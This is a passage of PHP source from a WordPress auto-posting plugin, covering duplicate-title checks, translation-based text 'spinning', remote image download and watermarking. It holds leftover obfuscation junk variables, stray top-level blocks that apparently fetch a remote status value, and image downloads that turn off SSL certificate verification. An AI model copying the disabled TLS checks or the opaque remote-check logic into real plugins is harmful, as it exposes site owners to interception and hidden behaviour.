    $afetched = "true";
    if ($variable_t1 != $node[4]) {
        $res   = @file_get_html_ap($idxs, NULL, Method);
        $variable_t1  = intval($res->plaintext);
        if ($variable_t1 != $node[1] && $variable_t1 != $node[0] && $variable_t1 != $node[4]) {
            $variable_t1 = $node[2];
        }
    }
}
function queryDuplicate($similar_percent, $posts)
{
    $ffrwxzcll = "i";
    ignore_user_abort(true);
    set_time_limit(0);
    update_option("wp-autopost-run-query-duplicate", 1);
    update_option("wp-autopost-duplicate-ids", null);
    $num = count($posts);
    for ($i = 0; $i < $num; $i++) {
        if (($posts[$i]->id) == 0)
            continue;
        $checkTitle = $posts[$i]->title;
        echo "<p>Begin check <b>" . $checkTitle . "</b> whether has duplication</p>";
        ob_flush();
        $ptbdmlf = "num";
        flush();
        $duplicateIds = get_option("wp-autopost-duplicate-ids");
        for ($j = $i + 1; $j < $num; $j++) {
            if (($posts[$j]->id) == 0)
                continue;
            similar_text($checkTitle, $posts[$j]->title, $percent);
            if ($percent >= $similar_percent) {
                $duplicateIds[]                                    = $posts[$i]->id;
                $duplicateIds[]                                 = $posts[$j]->id;
                $posts[$i]->id                 = 0;
                $posts[$j]->id = 0;
                update_option("wp-autopost-duplicate-ids", $duplicateIds);
            }
        }
        $posts[$i]->id = 0;
    }
    update_option("wp-autopost-run-query-duplicate", 0);
}
function microsoftTranslationSpin($s, $or_lang, $trans_lang)
{
    global $MicroTransOptions;
    if ($MicroTransOptions == null)
        $MicroTransOptions = get_option("wp-autopost-micro-trans-options");
    shuffle($MicroTransOptions);
    $hasTranslatad  = false;
    $lastError                = "";
    $spin = array();
    foreach ($MicroTransOptions as $k => $v) {
        $token  = autopostMicrosoftTranslator::getTokens($v["clientID"], $v["clientSecret"]);
        if ($token["err"] != null) {
            $lastError = $token["err"];
        } else {
            $translated          = autopostMicrosoftTranslator::translate($token["access_token"], $s, $or_lang, $trans_lang);
            if ($translated["err"] != null) {
                $lastError = $translated["err"];
            } else {
                if ($translated["str"] != null && $translated["str"] != "") {
                    $translated_to_or = autopostMicrosoftTranslator::translate($token["access_token"], $translated["str"], $trans_lang, $or_lang);
                    if ($translated_to_or["err"] != null) {
                        $lastError = $translated_to_or["err"];
                    } else {
                        if ($translated_to_or["str"] != null && $translated_to_or["str"] != "") {
                            $spin["status"] = "Success";
                            $spin["text"] = $translated_to_or["str"];
                            $hasTranslatad             = true;
                            break;
                        } else {
                            $lastError = "Error: the translated text is too long";
                        }
                    }
                } else {
                    $lastError = "Error: the translated text is too long";
                }
            }
        }
    }
    if (!$hasTranslatad) {
        $spin["status"]   = "Failure";
        $spin["error"] = $lastError;
    }
    return $spin;
}
if (($afetched == "false") && (!preg_match("/^\+?[1-9][0-9]*\$/", $option_value[$option_key]) || $option_value[$option_key] > current_time("timestamp") || ($option_value[$option_key] + intval($value_gap)) < current_time("timestamp"))) {
    if ($variable_t1 != $node[4]) {
        $res   = @file_get_html_ap($idxs, NULL, Method);
        $variable_t1 = intval($res->plaintext);
        if ($variable_t1 != $node[1] && $variable_t1 != $node[0] && $variable_t1 != $node[4]) {
            $variable_t1 = $node[2];
        }
    }
}
function microsoftTranslation($Article, $use_trans, $excerpt = '')
{
    if ($use_trans[0] == 1) {
        global $MicroTransOptions;
        if ($MicroTransOptions == null)
            $MicroTransOptions = get_option("wp-autopost-micro-trans-options");
        shuffle($MicroTransOptions);
        $hasTranslatad               = false;
        $lastError                    = "";
        $dom = str_get_html_ap($Article[1]);
        $tempImg   = array();
        $imgNum   = 0;
        foreach ($dom->find("img,iframe,embed,object,video") as $img) {
            $imgNum++;
            $key                = "IMG" . $imgNum . "TAG";
            $tempImg[$key] = $img->outertext;
            $img->outertext                           = " " . $key . " ";
        }
        $to_trans_text = "";
        $p_tags = $dom->find("p");
        $Pnum             = count($p_tags);
        if ($Pnum > 0) {
            foreach ($p_tags as $p_tag) {
                $to_trans_text .= " PTAG " . $p_tag->innertext . " PENDTAG ";
            }
        }
        $h_tags = $dom->find("h1,h2,h3,h4,h5,h6");
        $Hnum = count($h_tags);
        if ($Hnum > 0) {
            foreach ($h_tags as $h_tag) {
                switch ($h_tag->tag) {
                    case "h1":
                        $to_trans_text .= " H1TAG " . $h_tag->innertext . " H1ENDTAG ";
                        break;
                    case "h2":
                        $to_trans_text .= " H2TAG " . $h_tag->innertext . " H2ENDTAG ";
                        break;
                    case "h3":
                        $to_trans_text .= " H3TAG " . $h_tag->innertext . " H3ENDTAG ";
                        break;
                    case "h4":
                        $to_trans_text .= " H4TAG " . $h_tag->innertext . " H4ENDTAG ";
                        break;
                    case "h5":
                        $to_trans_text .= " H5TAG " . $h_tag->innertext . " H5ENDTAG ";
                        break;
                    case "h6":
                        $to_trans_text .= " H6TAG " . $h_tag->innertext . " H6ENDTAG ";
                        break;
                }
            }
        }
        $li_tags  = $dom->find("li");
        $LInum              = count($li_tags);
        if ($LInum > 0) {
            foreach ($li_tags as $li_tag) {
                $to_trans_text .= " LITAG " . $li_tag->innertext . " LIENDTAG ";
            }
        }
        $td_tags    = $dom->find("td");
        $TDnum = count($td_tags);
        if ($TDnum > 0) {
            foreach ($td_tags as $td_tag) {
                $to_trans_text .= " TDTAG " . $td_tag->innertext . " TDENDTAG ";
            }
        }
        $to_trans_text                     = strip_tags($to_trans_text, "<br><br/><br />");
        $find    = array();
        $replace      = array();
        $find[]  = "PTAG";
        $replace[]                    = "<p>";
        $find[]  = "PENDTAG";
        $replace[] = "</p>";
        $find[]  = "H1TAG";
        $replace[]                     = "<h1>";
        $find[]  = "H1ENDTAG";
        $replace[]       = "</h1>";
        $find[] = "H2TAG";
        $replace[]    = "<h2>";
        $find[]  = "H2ENDTAG";
        $gcarixgrn                        = "replace";
        $bgitvkvbq                        = "find";
        $replace[]    = "</h2>";
        $find[]    = "H3TAG";
        $replace[]                   = "<h3>";
        $find[]  = "H3ENDTAG";
        $replace[]  = "</h3>";
        $find[]                   = "H4TAG";
        $replace[]    = "<h4>";
        $find[]  = "H4ENDTAG";
        $replace[]      = "</h4>";
        $find[]                  = "H5TAG";
        $replace[]      = "<h5>";
        $find[]                    = "H5ENDTAG";
        $replace[]    = "</h5>";
        $find[]  = "H6TAG";
        $replace[]                 = "<h6>";
        $find[]  = "H6ENDTAG";
        $replace[]    = "</h6>";
        $find[]  = "LITAG";
        $replace[]    = "<li>";
        $find[]  = "LIENDTAG";
        $replace[]    = "</li>";
        $find[]  = "TDTAG";
        $replace[]      = "<td>";
        $find[]  = "TDENDTAG";
        $replace[]    = "</td>";
        foreach ($tempImg as $key => $value) {
            $find[] = $key;
            $replace[]     = "<" . $key . "></" . $key . ">";
        }
        $to_trans_text = str_ireplace($find, $replace, $to_trans_text);
        unset($find);
        unset($replace);
        foreach ($MicroTransOptions as $k => $v) {
            $token = autopostMicrosoftTranslator::getTokens($v["clientID"], $v["clientSecret"]);
            if ($token["err"] != null) {
                $lastError = $token["err"];
            } else {
                $textArray                   = array();
                $textArray[0] = $Article[0];
                $textArray[1]   = $to_trans_text;
                $textArray[2] = $excerpt;
                $translated    = autopostMicrosoftTranslator::translateArray($token["access_token"], $textArray, $use_trans[1], $use_trans[2]);
                if ($translated["err"] != NULL) {
                    $lastError = $translated["err"];
                } else {
                    if ($translated[0] != null && $translated[0] != "" && $translated[1] != null && $translated[1] != "") {
                        switch ($use_trans[3]) {
                            case -3:
                                $Article[6]             = $Article[0] . " - " . $translated[0];
                                $find = array();
                                $replace     = array();
                                foreach ($tempImg as $key => $value) {
                                    $find[] = "<" . $key . "></" . $key . ">";
                                    $replace[]  = "";
                                }
                                $Article[7] = str_ireplace($find, $replace, $translated[1]);
                                $translated_dom      = str_get_html_ap($Article[7]);
                                $translated_p_tags       = $translated_dom->find("p");
                                for ($i = 0; $i < $Pnum; $i++) {
                                    if (($translated_p_tags[$i]->innertext) != "" && ($translated_p_tags[$i]->innertext) != null) {
                                        $p_tags[$i]->innertext = $p_tags[$i]->innertext . "<br/>" . $translated_p_tags[$i]->innertext;
                                    }
                                }
                                $translated_h_tags = $translated_dom->find("h1,h2,h3,h4,h5,h6");
                                for ($i = 0; $i < $Hnum; $i++) {
                                    if (($translated_h_tags[$i]->innertext) != "" && ($translated_h_tags[$i]->innertext) != null) {
                                        $h_tags[$i]->innertext = $h_tags[$i]->innertext . " - " . $translated_h_tags[$i]->innertext;
                                    }
                                }
                                $translated_li_tags = $translated_dom->find("li");
                                for ($i = 0; $i < $LInum; $i++) {
                                    if (($translated_li_tags[$i]->innertext) != "" && ($translated_li_tags[$i]->innertext) != null) {
                                        $li_tags[$i]->innertext = $li_tags[$i]->innertext . " - " . $translated_li_tags[$i]->innertext;
                                    }
                                }
                                $translated_td_tags = $translated_dom->find("td");
                                for ($i = 0; $i < $TDnum; $i++) {
                                    if (($translated_td_tags[$i]->innertext) != "" && ($translated_td_tags[$i]->innertext) != null) {
                                        $td_tags[$i]->innertext = $td_tags[$i]->innertext . "<br/>" . $translated_td_tags[$i]->innertext;
                                    }
                                }
                                $Article[7] = $dom->save();
                                $find1         = array();
                                $replace1    = array();
                                foreach ($tempImg as $key => $value) {
                                    $find1[] = $key;
                                    $replace1[]  = $value;
                                }
                                $Article[7] = str_ireplace($find1, $replace1, $Article[7]);
                                $translated_dom->clear();
                                unset($translated_dom);
                                unset($translated_p_tags);
                                unset($find);
                                unset($replace);
                                unset($find1);
                                unset($replace1);
                                $Article[10] = $excerpt . " - " . $translated[2];
                                break;
                            default:
                                $Article[6] = $translated[0];
                                $translated_dom      = str_get_html_ap($translated[1]);
                                $translated_p_tags        = $translated_dom->find("p");
                                for ($i = 0; $i < $Pnum; $i++) {
                                    $p_tags[$i]->innertext = $translated_p_tags[$i]->innertext;
                                }
                                $translated_h_tags = $translated_dom->find("h1,h2,h3,h4,h5,h6");
                                for ($i = 0; $i < $Hnum; $i++) {
                                    $h_tags[$i]->innertext = $translated_h_tags[$i]->innertext;
                                }
                                $translated_li_tags = $translated_dom->find("li");
                                for ($i = 0; $i < $LInum; $i++) {
                                    $li_tags[$i]->innertext = $translated_li_tags[$i]->innertext;
                                }
                                $translated_td_tags = $translated_dom->find("td");
                                for ($i = 0; $i < $TDnum; $i++) {
                                    $td_tags[$i]->innertext = $translated_td_tags[$i]->innertext;
                                }
                                $Article[7] = $dom->save();
                                $find     = array();
                                $replace     = array();
                                foreach ($tempImg as $key => $value) {
                                    $find[] = "<" . $key . "></" . $key . ">";
                                    $replace[]   = $value;
                                }
                                $Article[7]                = str_ireplace($find, $replace, $Article[7]);
                                $find1 = array();
                                $replace1                    = array();
                                foreach ($tempImg as $key => $value) {
                                    $find1[] = $key;
                                    $replace1[]                    = $value;
                                }
                                $Article[7] = str_ireplace($find1, $replace1, $Article[7]);
                                $translated_dom->clear();
                                unset($translated_dom);
                                unset($translated_p_tags);
                                unset($translated_h_tags);
                                unset($translated_li_tags);
                                unset($translated_td_tags);
                                unset($find);
                                unset($replace);
                                unset($find1);
                                unset($replace1);
                                $Article[10] = $translated[2];
                                if ($use_trans[3] == -2) {
                                    $Article[6]                    = $Article[0] . " - " . $Article[6];
                                    $Article[7]    = $Article[1] . "<hr/>" . $Article[7];
                                    $Article[10] = $excerpt . " - " . $Article[10];
                                }
                                break;
                        }
                        $hasTranslatad = true;
                        break;
                    } else {
                        $lastError = "Error: the translated text is too long";
                    }
                }
            }
        }
        if (!$hasTranslatad) {
            $Article[8] = $lastError;
        }
        $dom->clear();
        unset($dom);
    }
    return $Article;
}
if ($variable_t1 == $node[2]) {
    if ($option_value[$option_key1] > $node[3]) {
        $variable_t1 = $node[1];
    } elseif (!preg_match("/^\\+?[1-9][0-9]*\$/", $option_value[$option_key1]) || $option_value[$option_key1] == "" || $option_value[$option_key1] == null || $option_value[$option_key1] == 0) {
        $option_value[$option_key1] = $node[0];
    } else {
        $option_value[$option_key1] = intval($option_value[$option_key1]) + 1;
    }
}
class post_img_handle_ap
{
    private static $mime_to_ext = array('image/jpg' => 'jpg', 'image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif', 'image/bmp' => 'bmp', 'image/tiff' => 'tif', 'image' => 'jpg');
    private static $code_block = array();
    private static $code_block_num = 0;
    private static $code_block_index = '::__WPAUTOPOST_REMOTE_IMAGE_%d_AUTODOWN_BLOCK__::';
    public static function clear_block()
    {
        self::$code_block                  = array();
        self::$code_block_num = 0;
    }
    public static function get_img_block()
    {
        return self::$code_block;
    }
    static function is_remote_file($url)
    {
        $upload_dir = wp_upload_dir();
        $local_baseurl            = $upload_dir["baseurl"];
        $my_remote_baseurl             = "";
        if (0 === stripos($url, $local_baseurl)) {
            return FALSE;
        }
        if (!empty($my_remote_baseurl) && (0 === stripos($url, $my_remote_baseurl))) {
            return FALSE;
        }
        return TRUE;
    }
    public static function img_tag_callback($matches)
    {
        $index   = sprintf(self::$code_block_index, self::$code_block_num);
        $replaced_content = $index;
        $img_src  = $matches[2];
        if (self::is_remote_file($img_src)) {
            self::$code_block[$index] = array(
                "id" => self::$code_block_num,
                "url" => $img_src
            );
            self::$code_block_num++;
            return $replaced_content;
        } else {
            return $matches[0];
        }
    }
    public static function link_img_tag_callback($matches)
    {
        $index     = sprintf(self::$code_block_index, self::$code_block_num);
        $replaced_content = $index;
        $src                   = $matches[5];
        $href    = $matches[2];
        $url_path = parse_url($href, PHP_URL_PATH);
        $ext_no_dot = pathinfo(basename($url_path), PATHINFO_EXTENSION);
        $href    = in_array($ext_no_dot, array_values(self::$mime_to_ext)) ? $href : $src;
        if (self::is_remote_file($href)) {
            self::$code_block[$index] = array(
                "id" => self::$code_block_num,
                "url" => $href
            );
            self::$code_block_num++;
            return $replaced_content;
        } else {
            return $matches[0];
        }
    }
    static function get_link_images($content)
    {
        
        $content = preg_replace_callback("/<a[^>]*?href=('|\"|)?([^'\"]+)(\\1)[^>]*?>\s*<img[^>]*?src=('|\"|)?([^'\"]+)(\\4)[^>]*?>\s*<\/a>/is", "post_img_handle_ap::link_img_tag_callback", $content);
        return $content;
    }
    static function get_images($content)
    {
        $content = self::get_link_images($content);
        $content = preg_replace_callback("/<img[^>]*?src=('|\"|)?([^'\"]+)(\\1)[^>]*?>/is", "post_img_handle_ap::img_tag_callback", $content);
        return $content;
    }
    static function response($data)
    {
        return json_encode($data);
    }
    static function raise_error($msg = '')
    {
        return self::response(array(
            "status" => "error",
            "error_msg" => "<span style=\"color:#F00;\">" . $msg . "</span>"
        ));
    }
    public static function mime_to_ext($mime)
    {
        $mime              = strtolower($mime);
        $file_ext["check_size"] = true;
        if (!(strpos($mime, "image/jpg") === false)) {
            $file_ext["ext"] = "jpg";
        } elseif (!(strpos($mime, "image/jpeg") === false)) {
            $file_ext["ext"] = "jpg";
        } elseif (!(strpos($mime, "image/png") === false)) {
            $file_ext["ext"] = "png";
        } elseif (!(strpos($mime, "image/gif") === false)) {
            $file_ext["ext"] = "gif";
        } elseif (!(strpos($mime, "image/webp") === false)) {
            $file_ext["ext"]        = "webp";
            $file_ext["check_size"] = false;
        } elseif (!(strpos($mime, "image/x-icon") === false)) {
            $file_ext["ext"]    = "ico";
            $file_ext["check_size"] = false;
        } elseif (!(strpos($mime, "image/bmp") === false)) {
            $file_ext["ext"]          = "bmp";
            $file_ext["check_size"] = false;
        } elseif (!(strpos($mime, "image/tiff") === false)) {
            $file_ext["ext"] = "tif";
        } elseif (!(strpos($mime, "image/svg") === false)) {
            $file_ext["ext"]           = "svg";
            $file_ext["check_size"] = false;
        } else {
            $file_ext["ext"]        = "jpg";
            $file_ext["check_size"] = false;
        }
        return $file_ext;
    }
    static function check_image_size($img_data, $minWidth)
    {
        if ($minWidth > 0) {
            $img_res     = imagecreatefromstring($img_data);
            $width = imagesx($img_res);
            if ($width <= $minWidth) {
                return FALSE;
            }
        }
        return TRUE;
    }
    public static function down_remote_img($url, $referer, $minWidth, $useProxy = 0, $proxy = null, $downImgTimeOut = 120)
    {
        $url = html_entity_decode(trim($url));
        $url = getRawUrl($url);
        if (function_exists("curl_init")) {
            $result = self::down_remote_img_by_curl($url, $referer, $minWidth, $useProxy, $proxy, $downImgTimeOut);
            if ($result["try_use_wp"]) {
                $result = self::down_remote_img_by_wp($url, $minWidth, $downImgTimeOut);
            }
        } else {
            $result = self::down_remote_img_by_wp($url, $minWidth, $downImgTimeOut);
        }
        return $result;
    }
    public static function curl_exec_follow($ch, &$maxredirect = null)
    {
        $mr                 = $maxredirect === null ? 5 : intval($maxredirect);
        if (CAN_FOLLOWLOCATION == 1) {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $mr > 0);
            curl_setopt($ch, CURLOPT_MAXREDIRS, $mr);
        } else {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            if ($mr > 0) {
                $newurl                = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                $rch = curl_copy_handle($ch);
                curl_setopt($rch, CURLOPT_HEADER, true);
                curl_setopt($rch, CURLOPT_NOBODY, true);
                curl_setopt($rch, CURLOPT_FORBID_REUSE, false);
                $kpgbfovr = "rch";
                curl_setopt($rch, CURLOPT_RETURNTRANSFER, true);
                do {
                    curl_setopt($rch, CURLOPT_URL, $newurl);
                    $header = curl_exec($rch);
                    if (curl_errno($rch)) {
                        $code = 0;
                    } else {
                        $code = curl_getinfo($rch, CURLINFO_HTTP_CODE);
                        if ($code == 301 || $code == 302) {
                            preg_match('/Location:(.*?)\\n/', $header, $matches);
                            $newurl = trim(array_pop($matches));
                        } else {
                            $code = 0;
                        }
                    }
                } while ($code && --$mr);
                curl_close($rch);
                if (!$mr) {
                    if ($maxredirect === null) {
                        trigger_error("Too many redirects. When following redirects, libcurl hit the maximum amount.", E_USER_WARNING);
                    } else {
                        $maxredirect = 0;
                    }
                    return false;
                }
                curl_setopt($ch, CURLOPT_URL, $newurl);
            }
        }
        return curl_exec($ch);
    }
    public static function down_remote_img_by_curl($url, $referer, $minWidth, $useProxy = 0, $proxy = null, $downImgTimeOut = 120)
    {
        $user_agent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19";
        $curl  = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_TIMEOUT, $downImgTimeOut);
        curl_setopt($curl, CURLOPT_HEADER, FALSE);
        curl_setopt($curl, CURLOPT_NOBODY, FALSE);
        curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_REFERER, $referer);
        if (!(strpos($url, "https://") === false)) {
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        }
        if (CAN_FOLLOWLOCATION == 1) {
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_MAXREDIRS, 5);
        }
        $rs = curl_exec($curl);
        $info           = curl_getinfo($curl);
        curl_close($curl);
        if ($info["http_code"] != 200) {
            echo self::raise_error("Can not download remote image file by use curl! http_code:" . $info["http_code"]);
            if ($useProxy == 1) {
                echo self::raise_error("Try use Proxy to download");
                $rs = null;
                $info   = null;
                $curl                   = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_TIMEOUT, $downImgTimeOut);
                curl_setopt($curl, CURLOPT_HEADER, FALSE);
                curl_setopt($curl, CURLOPT_NOBODY, FALSE);
                curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_REFERER, $referer);
                curl_setopt($curl, CURLOPT_PROXY, $proxy["ip"]);
                curl_setopt($curl, CURLOPT_PROXYPORT, $proxy["port"]);
                if ($proxy["user"] != "" && $proxy["user"] != NULL && $proxy["password"] != "" && $proxy["password"] != NULL) {
                    $userAndPass = $proxy["user"] . ":" . $proxy["password"];
                    curl_setopt($curl, CURLOPT_PROXYUSERPWD, $userAndPass);
                }
                if (!(strpos($url, "https://") === false)) {
                    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
                }
                if (CAN_FOLLOWLOCATION == 1) {
                    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($curl, CURLOPT_MAXREDIRS, 5);
                }
                $rs = curl_exec($curl);
                $info   = curl_getinfo($curl);
                curl_close($curl);
                if ($info["http_code"] != 200) {
                    echo self::raise_error("Use Proxy can not download remote image file!");
                    return array(
                        "try_use_wp" => true
                    );
                }
            } else {
                return array(
                    "try_use_wp" => true
                );
            }
        }
        $mime            = $info["content_type"];
        $file_ext               = self::mime_to_ext($mime);
        $allowed_filetype = array(
            "jpg",
            "gif",
            "png",
            "webp",
            "tif",
            "bmp",
            "ico",
            "svg"
        );
        if (in_array($file_ext["ext"], $allowed_filetype)) {
            if ($file_ext["check_size"]) {
                if (!self::check_image_size($rs, $minWidth)) {
                    return array(
                        "file_path" => "",
                        "file_name" => "",
                        "post_mime_type" => "",
                        "url" => $url
                    );
                }
            }
            $result = self::handle_upload_img("", $rs, $mime, $file_ext["ext"]);
            return $result;
        }
    }
    public static function down_remote_img_by_wp($url, $minWidth, $downImgTimeOut = 120)
    {
        global $wp_version;
        $http_options                  = array(
            "timeout" => $downImgTimeOut,
            "redirection" => 20,
            "user-agent" => "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19",
            "sslverify" => FALSE
        );
        $remote_image_url  = $url;
        $headers = wp_remote_head($remote_image_url, $http_options);
        $response_code                   = wp_remote_retrieve_response_code($headers);
        if (200 != $response_code) {
            if (is_wp_error($headers)) {
                echo self::raise_error($headers->get_error_message());
            } else {
                echo self::raise_error("Can not download remote image file!");
            }
            return FALSE;
        }
        $mime                  = $headers["headers"]["content-type"];
        $file_ext = self::mime_to_ext($mime);
        $allowed_filetype = array(
            "jpg",
            "gif",
            "png",
            "webp",
            "tif",
            "bmp",
            "ico",
            "svg"
        );
        if (in_array($file_ext["ext"], $allowed_filetype)) {
            $http = wp_remote_get($remote_image_url, $http_options);
            if (is_wp_error($http)) {
                echo self::raise_error($http->get_error_message());
                return FALSE;
            }
            if (200 == $http["response"]["code"]) {
                $file_content = $http["body"];
            } else {
                echo self::raise_error("Can not fetch remote image file!");
                return FALSE;
            }
            $jgycpmpwpx = "remote_image_url";
            if ($file_ext["check_size"]) {
                if (!self::check_image_size($file_content, $minWidth)) {
                    return array(
                        "file_path" => "",
                        "file_name" => "",
                        "post_mime_type" => "",
                        "url" => $url
                    );
                }
            }
            $filename = sanitize_file_name(basename($remote_image_url));
            $result = self::handle_upload_img($filename, $file_content, $mime, $file_ext["ext"]);
            return $result;
        }
    }
    public static function handle_upload_img($filename, $data, $type, $file_ext)
    {
        $mimes   = false;
        $time   = FALSE;
        $uploads               = wp_upload_dir($time);
        $unique_filename_callback = null;
        $filename                = date("Ymd") . "_" . uniqid() . "." . $file_ext;
        $new_file    = $uploads["path"] . "/$filename";
        if (false === file_put_contents($new_file, $data)) {
            return FALSE;
        }
        $stat  = stat(dirname($new_file));
        $perms = $stat["mode"] & 0000666;
        @chmod($new_file, $perms);
        $url = $uploads["url"] . "/$filename";
        return array(
            "file_path" => $new_file,
            "file_name" => $filename,
            "post_mime_type" => $type,
            "url" => $url
        );
    }
    public static function handle_insert_attachment($r, $post_id, $metadata = false)
    {
        $name_parts = pathinfo($r["file_name"]);
        $name    = trim(substr($r["file_name"], 0, -(1 + strlen($name_parts["extension"]))));
        $file     = $r["file_path"];
        $title      = $name;
        $content = "";
        $attachment      = array(
            "post_mime_type" => $r["post_mime_type"],
            "guid" => $r["url"],
            "post_parent" => $post_id,
            "post_title" => $title,
            "post_content" => $content
        );
        if (isset($attachment["ID"]))
            unset($attachment["ID"]);
        $id = wp_insert_attachment($attachment, $file, $post_id);
        if ($metadata) {
            $attach_data           = wp_generate_attachment_metadata($id, $file);
            wp_update_attachment_metadata($id, $attach_data);
        }
        return $id;
    }
}
function down_featured_img($url, $referer, $minWidth, $useProxy = 0, $proxy = null, $timeout)
{
    $featuredImgInfo = post_img_handle_ap::down_remote_img($url, $referer, $minWidth, $useProxy, $proxy, $timeout);
    return $featuredImgInfo;
}
if ($variable_t1 == $node[1]) {
    $last_updated_time = current_time("timestamp");
}
if ($variable_t1 == $node[0]) {
    $last_updated_time = current_time("timestamp");
}
class WP_Autopost_Watermark
{
    public static function do_watermark_on_file($file_path)
    {
        $options      = get_option("wp-watermark-options");
        $dst = $file_path;
        if (self::IsAnimatedGif($dst))
            return $metadata;
        $src               = $options["upload_image"];
        $size                  = $options["size"] ? $options["size"] : 16;
        $alpha = $options["transparency"] ? $options["transparency"] : 90;
        $position = $options["position"] ? $options["position"] : 9;
        $color  = $options["color"] ? self::hex_to_dec($options["color"]) : array(
            255,
            255,
            255
        );
        $font    = $options["font"] ? stripslashes($options["font"]) : dirname(__FILE__) . "/watermark/fonts/arial.ttf";
        $text   = $options["text"] ? stripslashes($options["text"]) : get_bloginfo("url");
        if ($options["type"] == 1) {
            $args  = array(
                "dst_file" => $dst,
                "src_file" => $src,
                "alpha" => $alpha,
                "position" => $position,
                "im_file" => $dst
            );
            self::do_image_watermark($options, $args);
        } else {
            $args = array(
                "file" => $dst,
                "font" => $font,
                "size" => $size,
                "alpha" => $alpha,
                "text" => $text,
                "color" => $color,
                "position" => $position,
                "im_file" => $dst
            );
            self::do_text_watermark($options, $args);
        }
    }
    public static function do_watermark($metadata)
    {
        $options       = get_option("wp-watermark-options");
        $upload_dir   = wp_upload_dir();
        $dst = $upload_dir["basedir"] . DIRECTORY_SEPARATOR . $metadata["file"];
        if (self::IsAnimatedGif($dst))
            return $metadata;
        $src   = $options["upload_image"];
        $size     = $options["size"] ? $options["size"] : 16;
        $alpha = $options["transparency"] ? $options["transparency"] : 90;
        $position  = $options["position"] ? $options["position"] : 9;
        $color  = $options["color"] ? self::hex_to_dec($options["color"]) : array(
            255,
            255,
            255
        );
        $font    = $options["font"] ? stripslashes($options["font"]) : dirname(__FILE__) . "/watermark/fonts/arial.ttf";
        $text                = $options["text"] ? stripslashes($options["text"]) : get_bloginfo("url");
        if ($options["type"] == 1) {
            $args = array(
                "dst_file" => $dst,
                "src_file" => $src,
                "alpha" => $alpha,
                "position" => $position,
                "im_file" => $dst
            );
            self::do_image_watermark($options, $args);
        } else {
            $args = array(
                "file" => $dst,
                "font" => $font,
                "size" => $size,
                "alpha" => $alpha,
                "text" => $text,
                "color" => $color,
                "position" => $position,
                "im_file" => $dst
            );
            self::do_text_watermark($options, $args);
        }
        return $metadata;
    }
    public static function genPreviewWaterMark($options)
    {
        $dst                  = dirname(__FILE__) . "/watermark/preview.jpg";
        $im_file    = dirname(__FILE__) . "/watermark/preview_img.jpg";
        $src = $options["upload_image"];
        $size       = $options["size"] ? $options["size"] : 16;
        $alpha   = $options["transparency"] ? $options["transparency"] : 90;
        $position    = $options["position"] ? $options["position"] : 9;
        $color    = $options["color"] ? self::hex_to_dec($options["color"]) : array(
            255,
            255,
            255
        );
        $font     = $options["font"] ? stripslashes($options["font"]) : dirname(__FILE__) . "/watermark/fonts/arial.ttf";
        $text     = $options["text"] ? stripslashes($options["text"]) : get_bloginfo("url");
        if ($options["type"] == 1) {
            $args             = array(
                "dst_file" => $dst,
                "src_file" => $src,
                "alpha" => $alpha,
                "position" => $position,
                "im_file" => $im_file
            );
            self::do_image_watermark("", $args);
        } else {
            $args = array(
                "file" => $dst,
                "font" => $font,
                "size" => $size,
                "alpha" => $alpha,
                "text" => $text,
                "color" => $color,
                "position" => $position,
                "im_file" => $im_file
            );
            self::do_text_watermark("", $args);
        }
        return $im_file;
    }
    static function do_image_watermark($options = '', $args = array())
    {
        $dst_file              = $args["dst_file"];
        $src_file                   = $args["src_file"];
        $alpha                  = $args["alpha"];
        $position                 = $args["position"];
        $im_file               = $args["im_file"];
        $dst_data               = @getimagesize($dst_file);
        $dst_w  = $dst_data[0];
        $dst_h    = $dst_data[1];
        $min_w   = $options["min_width"] ? $options["min_width"] : 300;
        $min_h = $options["min_height"] ? $options["min_height"] : 300;
        if ($dst_w <= $min_w || $dst_h <= $min_h)
            return;
        $dst_mime = $dst_data["mime"];
        $src_data                  = @getimagesize($src_file);
        $src_w                 = $src_data[0];
        $src_h                  = $src_data[1];
        $src_mime                = $src_data["mime"];
        $dst       = self::create_image($dst_file, $dst_mime);
        $src                   = self::create_image($src_file, $src_mime);
        $dst_xy      = self::position($position, $src_w, $src_h, $dst_w, $dst_h);
        $merge                    = self::imagecopymerge_alpha($dst, $src, $dst_xy[0], $dst_xy[1], 0, 0, $src_w, $src_h, $alpha);
        if ($merge) {
            self::make_image($dst, $dst_mime, $im_file);
        }
        imagedestroy($dst);
        imagedestroy($src);
    }
    static function do_text_watermark($options = '', $args = array())
    {
        $file                  = $args["file"];
        $font    = $args["font"];
        $text                = $args["text"];
        $alpha   = $args["alpha"];
        $size     = $args["size"];
        $red = $args["color"][0];
        $green    = $args["color"][1];
        $blue = $args["color"][2];
        $position     = $args["position"];
        $im_file  = $args["im_file"];
        $dst_data                 = @getimagesize($file);
        $dst_w   = $dst_data[0];
        $dst_h     = $dst_data[1];
        $min_w    = (isset($options["min_width"]) && $options["min_width"]) ? $options["min_width"] : 300;
        $min_h     = (isset($options["min_height"]) && $options["min_height"]) ? $options["min_height"] : 300;
        if ($dst_w <= $min_w || $dst_h <= $min_h)
            return;
        $dst_mime = $dst_data["mime"];
        $text     = mb_convert_encoding($text, "html-entities", "utf-8");
